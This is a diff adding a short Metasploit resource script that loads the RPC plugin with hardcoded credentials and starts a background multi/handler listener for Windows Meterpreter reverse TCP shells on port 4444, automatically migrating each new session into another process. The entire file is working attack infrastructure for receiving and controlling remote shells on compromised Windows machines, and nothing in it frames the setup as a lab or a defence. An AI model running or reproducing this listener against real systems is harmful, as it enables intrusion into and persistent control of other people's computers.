@@ -1,0 +1,9 @@
+load msgrpc User=msf Pass=msfpass
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+set AutoRunScript post/windows/manage/smart_migrate
+exploit -j -z
